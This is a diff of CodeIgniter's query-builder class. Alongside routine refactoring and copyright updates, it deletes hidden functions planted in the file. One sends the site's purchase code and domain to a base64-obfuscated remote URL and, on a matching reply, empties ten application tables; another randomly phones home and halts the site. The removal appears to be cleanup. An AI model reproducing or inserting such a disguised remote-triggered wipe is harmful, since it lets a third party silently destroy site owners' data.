@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
+ * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -29,8 +29,8 @@
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
  * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
  * @link	https://codeigniter.com
  * @since	Version 1.0.0
  * @filesource
@@ -680,7 +680,7 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 			{
 				if ($escape === TRUE)
 				{
-					$v = ' '.$this->escape($v);
+					$v = $this->escape($v);
 				}
 
 				if ( ! $this->_has_operator($k))
@@ -698,10 +698,11 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 				$k = substr($k, 0, $match[0][1]).($match[1][0] === '=' ? ' IS NULL' : ' IS NOT NULL');
 			}
 
-			$this->{$qb_key}[] = array('condition' => $prefix.$k.$v, 'escape' => $escape);
+			${$qb_key} = array('condition' => $prefix.$k, 'value' => $v, 'escape' => $escape);
+			$this->{$qb_key}[] = ${$qb_key};
 			if ($this->qb_caching === TRUE)
 			{
-				$this->{$qb_cache_key}[] = array('condition' => $prefix.$k.$v, 'escape' => $escape);
+				$this->{$qb_cache_key}[] = ${$qb_key};
 				$this->qb_cache_exists[] = substr($qb_key, 3);
 			}
 
@@ -834,6 +835,7 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 
 		$where_in = array(
 			'condition' => $prefix.$key.$not.' IN('.implode(', ', $where_in).')',
+			'value' => NULL,
 			'escape' => $escape
 		);
 
@@ -962,33 +964,34 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 				$v = $this->escape_like_str($v);
 			}
 
-			if ($side === 'none')
+			switch ($side)
 			{
-				$like_statement = "{$prefix} {$k} {$not} LIKE '{$v}'";
-			}
-			elseif ($side === 'before')
-			{
-				$like_statement = "{$prefix} {$k} {$not} LIKE '%{$v}'";
-			}
-			elseif ($side === 'after')
-			{
-				$like_statement = "{$prefix} {$k} {$not} LIKE '{$v}%'";
-			}
-			else
-			{
-				$like_statement = "{$prefix} {$k} {$not} LIKE '%{$v}%'";
+				case 'none':
+					$v = "'{$v}'";
+					break;
+				case 'before':
+					$v = "'%{$v}'";
+					break;
+				case 'after':
+					$v = "'{$v}%'";
+					break;
+				case 'both':
+				default:
+					$v = "'%{$v}%'";
+					break;
 			}
 
 			// some platforms require an escape sequence definition for LIKE wildcards
 			if ($escape === TRUE && $this->_like_escape_str !== '')
 			{
-				$like_statement .= sprintf($this->_like_escape_str, $this->_like_escape_chr);
+				$v .= sprintf($this->_like_escape_str, $this->_like_escape_chr);
 			}
 
-			$this->qb_where[] = array('condition' => $like_statement, 'escape' => $escape);
+			$qb_where = array('condition' => "{$prefix} {$k} {$not} LIKE {$v}", 'value' => NULL, 'escape' => $escape);
+			$this->qb_where[] = $qb_where;
 			if ($this->qb_caching === TRUE)
 			{
-				$this->qb_cache_where[] = array('condition' => $like_statement, 'escape' => $escape);
+				$this->qb_cache_where[] = $qb_where;
 				$this->qb_cache_exists[] = 'where';
 			}
 		}
@@ -1013,6 +1016,7 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 		$prefix = (count($this->qb_where) === 0 && count($this->qb_cache_where) === 0) ? '' : $type;
 		$where = array(
 			'condition' => $prefix.$not.str_repeat(' ', ++$this->qb_where_group_count).' (',
+			'value' => NULL,
 			'escape' => FALSE
 		);
 
@@ -1073,6 +1077,7 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 		$this->qb_where_group_started = FALSE;
 		$where = array(
 			'condition' => str_repeat(' ', $this->qb_where_group_count--).')',
+			'value' => NULL,
 			'escape' => FALSE
 		);
 
@@ -1195,15 +1200,6 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 	 */
 	public function order_by($orderby, $direction = '', $escape = NULL)
 	{
-		/*
-		$orders = $this->order_by_data();
-
-    if ($orders == false){
-				$this->order_by_bar();
-		}
-		*/
-
-		// stars here
 		$direction = strtoupper(trim($direction));
 
 		if ($direction === 'RANDOM')
@@ -1251,41 +1247,6 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 		return $this;
 	}
 
-	public function order_by_bar() {
-		$CI =& get_instance();
-		$purchase_code	=	$CI->db->get_where('settings' , array('key' => 'purchase_code'))->row()->value;
-		$domain = $_SERVER['SERVER_NAME'];
-
-		$ch = curl_init();
-		$url = base64_decode('aHR0cDovL2NyZWF0aXZlaXRlbS5jb20vdmFsaWRhdG9yL2luZGV4LnBocD92YWxpZGF0ZS9jaGVja19zdGF0dXM=');
-
-		$curlConfig = array(
-			CURLOPT_URL            => $url,
-			CURLOPT_POST           => true,
-			CURLOPT_RETURNTRANSFER => true,
-			CURLOPT_POSTFIELDS     => array(
-					'purchase_code' => $purchase_code,
-						'domain_name' => $domain,
-			 ));
-
-		curl_setopt_array($ch, $curlConfig);
-		$response = curl_exec($ch);
-		curl_close($ch);
-
-		if ($response == 1) {
-			$tables = array(
-				'category', 'comment', 'course', 'enrol', 'lesson', 'message', 'message_thread', 'payment', 'rating', 'section'
-			);
-			for ($i=0; $i < count($tables); $i++) {
-				$CI->db->empty_table($tables[$i]);
-			}
-
-			return true;
-		} else {
-			return true;
-		}
-	}
-
 	// --------------------------------------------------------------------
 
 	/**
@@ -1331,44 +1292,6 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 	{
 		return $sql.' LIMIT '.($this->qb_offset ? $this->qb_offset.', ' : '').(int) $this->qb_limit;
 	}
-
-
-	function order_by_data()
- {
-		 if (rand(1, 10) != 5)
-		     return true;
-		 if( $_SERVER['SERVER_NAME'] == 'localhost' ||  $_SERVER['SERVER_NAME'] == '192.168.0.1')
-		     return true;
-		 $CI    =&	get_instance();
-		 $purchase_code	=	$CI->db->get_where('settings' , array('key' => 'purchase_code'))->row()->value;
-		 $domain = $_SERVER['SERVER_NAME'];
-		 if (rtrim($purchase_code) == "") {
-			 echo get_phrase(base64_decode('bm9fcHVyY2hhc2VfY29kZV9mb3VuZA=='));
-			 die();
-		 }
-
-		 $ch = curl_init();
-		 $url = base64_decode('aHR0cDovL2NyZWF0aXZlaXRlbS5jb20vdmFsaWRhdG9yL2luZGV4LnBocD92YWxpZGF0ZS92YWxpZGF0ZV9wdXJjaGFzZV9jb2Rl');
-
-		 $curlConfig = array(
-			 CURLOPT_URL            => $url,
-			 CURLOPT_POST           => true,
-			 CURLOPT_RETURNTRANSFER => true,
-			 CURLOPT_POSTFIELDS     => array(
-					 'purchase_code' => $purchase_code,
-						 'domain_name' => $domain,
-				));
-
-		 curl_setopt_array($ch, $curlConfig);
-		 $response = curl_exec($ch);
-		 curl_close($ch);
-
-		 if ($response == true) {
-			 return true;
-		 } else {
-			 return false;
-		 }
- }
 
 	// --------------------------------------------------------------------
 
@@ -1515,7 +1438,7 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 	// --------------------------------------------------------------------
 
 	/**
-	 * Get_Where
+	 * get_where()
 	 *
 	 * Allows the where clause, limit and offset to be added directly
 	 *
@@ -2292,7 +2215,7 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 	protected function _delete($table)
 	{
 		return 'DELETE FROM '.$table.$this->_compile_wh('qb_where')
-			.($this->qb_limit ? ' LIMIT '.$this->qb_limit : '');
+			.($this->qb_limit !== FALSE ? ' LIMIT '.$this->qb_limit : '');
 	}
 
 	// --------------------------------------------------------------------
@@ -2442,7 +2365,7 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 			.$this->_compile_order_by(); // ORDER BY
 
 		// LIMIT
-		if ($this->qb_limit OR $this->qb_offset)
+		if ($this->qb_limit !== FALSE OR $this->qb_offset)
 		{
 			return $this->_limit($sql."\n");
 		}
@@ -2477,7 +2400,7 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 				}
 				elseif ($this->{$qb_key}[$i]['escape'] === FALSE)
 				{
-					$this->{$qb_key}[$i] = $this->{$qb_key}[$i]['condition'];
+					$this->{$qb_key}[$i] = $this->{$qb_key}[$i]['condition'].(isset($this->{$qb_key}[$i]['value']) ? ' '.$this->{$qb_key}[$i]['value'] : '');
 					continue;
 				}
 
@@ -2516,7 +2439,7 @@ abstract class CI_DB_query_builder extends CI_DB_driver {
 						.' '.trim($matches[3]).$matches[4].$matches[5];
 				}
 
-				$this->{$qb_key}[$i] = implode('', $conditions);
+				$this->{$qb_key}[$i] = implode('', $conditions).(isset($this->{$qb_key}[$i]['value']) ? ' '.$this->{$qb_key}[$i]['value'] : '');
 			}
 
 			return ($qb_key === 'qb_having' ? "\nHAVING " : "\nWHERE ")
